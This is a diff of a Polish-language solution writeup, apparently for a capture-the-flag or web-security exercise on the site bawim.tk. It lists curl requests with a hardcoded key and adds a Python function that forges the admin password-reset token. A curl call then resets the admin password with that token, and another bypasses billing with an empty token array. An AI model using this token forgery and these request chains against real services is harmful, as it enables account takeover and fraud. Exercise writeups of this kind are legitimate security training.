@@ -45,6 +45,23 @@ parametry: key, billing_token, json - ten endpoint obsługuje dane wejściowe w 
   curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/user/386  
   curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d user_key=AnbgzkuaayRdT4HIab8lV513 https://bawim.tk/user_data/386  
   curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/reset_password/386  
+  
+  ```python
+  # Funkcja generujaca token yKW@n3UoT5n@xU5n@xUu.s
+  def generate():
+    plaintext = ('386' + 'admin' + 'admin@bawim.tk')[::-1]
+    token = ''
+    alphabet = string.ascii_letters + string.digits + '@.'
+    sbox = '2k8PseIuF.YTWUovx6BqbnOyQ@5dtERZKMc3iwg7jLN40lzpJmrHAShVaf1XCG9D'
+
+    for char in plaintext:
+        token += sbox[(alphabet.index(char) + 13) % len(alphabet)]
+
+    return token
+  ```
+  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d new_password=<wpisz_nowe_hasło_admina> https://bawim.tk/set_password/386/yKW@n3UoT5n@xU5n@xUu.s
+  
+  
   curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d json={\"billing_token\":[]} http://bawim.tk/set_premium_account/200  
   
 </details>
